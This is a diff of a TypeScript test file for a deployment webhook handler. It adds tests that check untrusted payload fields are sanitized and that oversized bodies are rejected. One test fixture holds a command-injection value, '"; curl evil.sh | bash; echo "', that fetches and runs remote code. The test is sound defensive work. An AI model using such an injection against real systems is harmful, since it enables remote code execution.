@@ -79,7 +79,7 @@ describe('webhook handler', () => {
     status: 'SUCCESS',
     service: { name: 'vitalcv-web' },
     environment: { name: 'production' },
-    deployment: { id: 'd1', meta: { commitHash: 'abc' } },
+    deployment: { id: 'd1', meta: { commitHash: 'abc1234def' } },
   };
 
   function req(body: unknown, opts: { bearer?: string; query?: string } = {}): Request {
@@ -107,7 +107,34 @@ describe('webhook handler', () => {
     });
     expect(res.status).toBe(202);
     expect(dispatch).toHaveBeenCalledOnce();
-    expect(dispatch.mock.calls[0][0]).toMatchObject({ token: 'ght', clientPayload: { commit: 'abc', deploymentId: 'd1' } });
+    expect(dispatch.mock.calls[0][0]).toMatchObject({ token: 'ght', clientPayload: { commit: 'abc1234def', deploymentId: 'd1' } });
+  });
+
+  it('sanitizes untrusted payload fields before dispatch (non-hex commit → null, strings truncated)', async () => {
+    const dispatch = vi.fn().mockResolvedValue({ ok: true, status: 204, detail: 'dispatched' });
+    const evil = {
+      ...good,
+      deployment: { id: 'x'.repeat(500), meta: { commitHash: '"; curl evil.sh | bash; echo "' } },
+    };
+    const res = await __handleForTests(req(evil, { bearer: 'sekret' }), {
+      env: { cronSecret: 'sekret', githubToken: 'ght' },
+      dispatch,
+    });
+    expect(res.status).toBe(202);
+    const payload = dispatch.mock.calls[0][0].clientPayload as Record<string, string | null>;
+    expect(payload.commit).toBeNull(); // shell metacharacters are not a hex SHA
+    expect(payload.deploymentId?.length).toBeLessThanOrEqual(200);
+  });
+
+  it('413s an oversized body without dispatching', async () => {
+    const dispatch = vi.fn();
+    const big = { ...good, junk: 'z'.repeat(150_000) };
+    const res = await __handleForTests(req(big, { bearer: 'sekret' }), {
+      env: { cronSecret: 'sekret', githubToken: 'ght' },
+      dispatch,
+    });
+    expect(res.status).toBe(413);
+    expect(dispatch).not.toHaveBeenCalled();
   });
 
   it('200 no-op (no dispatch) on a non-SUCCESS event', async () => {
